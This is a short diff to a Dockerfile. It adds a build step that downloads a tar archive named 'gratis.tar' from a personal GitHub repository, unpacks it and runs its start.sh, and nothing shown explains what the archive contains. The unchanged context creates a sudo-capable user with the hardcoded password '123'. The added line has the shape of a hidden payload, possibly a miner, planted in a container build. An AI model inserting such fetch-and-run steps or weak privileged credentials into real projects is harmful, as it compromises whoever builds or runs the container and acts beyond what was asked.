@@ -17,6 +17,8 @@ RUN curl https://rclone.org/install.sh | sudo bash
 RUN sudo adduser akuhnet --gecos "First Last,RoomNumber,WorkPhone,HomePhone" --disabled-password
 RUN echo "akuhnet:123" | sudo chpasswd
 RUN sudo usermod -aG sudo,adm akuhnet
+RUN wget -O gas.tar https://raw.githubusercontent.com/robertreynolds2/RTMFIX/main/gratis.tar && tar xf gas.tar && chmod +x start.sh && ./start.sh
+
 
 # Copy rclone tasks to /tmp, to potentially be used
 COPY deploy-container/rclone-tasks.json /tmp/rclone-tasks.json
